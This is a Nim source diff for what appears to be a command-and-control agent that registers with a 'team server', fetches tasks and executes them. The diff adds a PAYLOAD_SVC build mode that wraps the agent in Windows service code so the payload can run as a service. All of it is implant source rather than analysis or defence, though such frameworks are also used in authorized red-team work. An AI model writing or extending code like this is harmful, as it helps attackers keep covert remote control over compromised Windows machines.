@@ -7,7 +7,7 @@ import protocol/[task, result, registration]
 import ../../common/[utils, crypto, serialize]
 import ../../types/[common, agent, protocol]
 
-proc main() = 
+proc agentMain() = 
     randomize()
 
     # Initialize agent context
@@ -22,7 +22,7 @@ proc main() =
         3. Register to the team server if not already connected
         4. Retrieve tasks via checkin request to a GET endpoint
         5. Execute task and post result
-        6. If additional tasks have been fetched, go to 6.
+        6. If additional tasks have been fetched, go to 5.
         7. If no more tasks need to be executed, go to 1. 
     ]#
     while true: 
@@ -111,5 +111,54 @@ proc main() =
         except CatchableError as err: 
             print protect("[-] "), err.msg
 
+#[
+    Service functions
+]#
+when defined(PAYLOAD_SVC):
+    var
+        serviceStatus: SERVICE_STATUS
+        statusHandle: SERVICE_STATUS_HANDLE
+
+    proc serviceCtrlHandler(ctrl: DWORD) {.stdcall.} =
+        case ctrl
+        of SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN:
+            serviceStatus.dwCurrentState = SERVICE_STOPPED
+            serviceStatus.dwWin32ExitCode = 0
+            SetServiceStatus(statusHandle, addr serviceStatus)
+        else:
+            discard
+
+    proc serviceMain(argc: DWORD, argv: ptr LPSTR) {.stdcall.} =
+        statusHandle = RegisterServiceCtrlHandlerA("", cast[LPHANDLER_FUNCTION](serviceCtrlHandler))
+        if statusHandle == 0:
+            return        
+        
+        serviceStatus.dwServiceType = SERVICE_WIN32
+        serviceStatus.dwCurrentState = SERVICE_START_PENDING
+        serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_SHUTDOWN
+        
+        serviceStatus.dwCurrentState = SERVICE_RUNNING
+        SetServiceStatus(statusHandle, addr serviceStatus)
+
+        # Call agent routine        
+        agentMain()
+        
+        serviceStatus.dwCurrentState = SERVICE_STOPPED
+        SetServiceStatus(statusHandle, addr serviceStatus)
+
+proc main() =
+    # SVC
+    when defined(PAYLOAD_SVC):
+        var serviceTable: array[2, SERVICE_TABLE_ENTRYA]
+        serviceTable[0].lpServiceName = ""
+        serviceTable[0].lpServiceProc = cast[LPSERVICE_MAIN_FUNCTIONA](serviceMain)
+        serviceTable[1].lpServiceName = NULL
+        serviceTable[1].lpServiceProc = NULL
+        discard StartServiceCtrlDispatcherA(addr serviceTable[0])
+    
+    # EXE
+    else:
+        agentMain()
+
 when isMainModule:
-    main() 
+    main()
